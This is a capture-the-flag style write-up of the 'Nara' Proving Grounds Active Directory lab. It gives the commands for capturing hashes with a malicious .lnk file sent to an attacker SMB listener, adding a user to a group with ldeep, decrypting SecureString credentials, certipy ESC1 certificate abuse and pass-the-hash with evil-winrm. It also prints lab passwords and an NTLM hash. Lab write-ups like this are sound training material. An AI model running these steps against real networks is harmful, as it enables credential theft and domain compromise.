# Nara -- Proving Grounds (write-up)

**Difficulty:** Hard
**Box:** Nara (Proving Grounds)
**Author:** dsec
**Date:** 2025-11-27

---

## TL;DR

### AD box. Guest SMB access led to hashgrab via malicious .lnk file. Cracked Tracy.White's NTLMv2 hash, used ldeep to add her to Remote Access group. Found encrypted cred file, decrypted for Jodie.Summers. Certipy found ESC1/ESC4 but the box appeared broken during exploitation.
---
## Target info

- Host: `192.168.190.30`
- Domain: `nara-security.com` / `NARASEC`
---
## Enumeration

```bash
sudo nmap -Pn -n 192.168.190.30 -sCV -p- --open -vvv
```

![Nmap results](images/nara-pg_1.png)

![SMB enumeration](images/nara-pg_2.png)

![LDAP enumeration](images/nara-pg_3.png)

![Domain info](images/nara-pg_4.png)

![Share listing](images/nara-pg_5.png)

![User access](images/nara-pg_6.png)

Used nxc to enumerate users:

![NXC user enum](images/nara-pg_7.png)

![User list](images/nara-pg_8.png)

Found users including Tracy.White, Jodie.Summers, Damian.Johnson, Helen.Robinson, and others.

![Share access](images/nara-pg_9.png)

![Further SMB](images/nara-pg_10.png)

Tried usernames as passwords and lowercase variants -- nothing worked.

---
## Initial foothold -- hashgrab

Created a malicious .lnk file with hashgrab:

```bash
python3 hashgrab.py 192.168.45.208 test
```

![Hashgrab](images/nara-pg_11.png)

Started an SMB listener:

```bash
smbserver.py smb share/ -smb2support
```

Connected as guest and uploaded `test.lnk` to the Nara share `/Documents`:

```bash
smbclient.py narasec/guest:''@192.168.195.30
```

![Upload lnk](images/nara-pg_12.png)

Captured Tracy.White's NTLMv2 hash:

![Hash captured](images/nara-pg_13.png)

Cracked it:

![Cracked hash](images/nara-pg_14.png)

Creds: `tracy.white:zqwj041FGX`

---
## Lateral movement

Used ldeep to add Tracy.White to the Remote Access group:

```bash
ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
```

![Group added](images/nara-pg_15.png)

Got a shell:

![Shell as tracy](images/nara-pg_16.png)

Found an encrypted credential file. Decrypted it with PowerShell:

```powershell
$pw = Get-Content cred.txt | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
$UnsecurePassword
```

Password: `hHO_S9gff7ehXw`

![Decrypted cred](images/nara-pg_17.png)

![Jodie access](images/nara-pg_18.png)

Creds: `jodie.summers:hHO_S9gff7ehXw`

Evil-winrm showed same privileges on the same machine.

---
## AD enumeration

Ran dnschef + bloodhound-python:

![Bloodhound](images/nara-pg_19.png)

![Attack paths](images/nara-pg_20.png)

Both users showed DCSync attack paths but the details were vague.

---
## Privesc attempt -- Certipy (ESC1/ESC4)

```bash
certipy find -dc-ip 192.168.195.30 -ns 192.168.195.30 -u jodie.summers@nara-security.com -p 'hHO_S9gff7ehXw'
```

![Certipy scan](images/nara-pg_21.png)

![Vulnerable templates](images/nara-pg_22.png)

Found ESC1 and ESC4 vulnerabilities on the NARAUSER template.

#### **Box appeared broken during exploitation.** Checked every walkthrough available and even copy-pasted from the official walkthrough. The certipy request kept failing.

```bash
certipy-ad req -username JODIE.SUMMERS -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 172.16.201.26 -debug
```

![Error](images/nara-pg_23.png)

After rebooting the box and VM, got the same error as a video walkthrough (where the author had to re-run multiple times until it worked).

Expected result:

![Expected output](images/nara-pg_24.png)

Final commands (when working):

```bash
certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 172.16.201.26
evil-winrm -u administrator -i nara-security.com -H d35c4ae45bdd10a4e28ff529a2155745
```

---
## Lessons & takeaways

- Malicious .lnk files via hashgrab are effective for capturing NTLMv2 hashes from file shares
- PowerShell `ConvertTo-SecureString` creds can be reversed if you have access to the same machine/user context
- ESC1/ESC4 certificate abuse is powerful but can be finicky -- sometimes boxes need resets
---
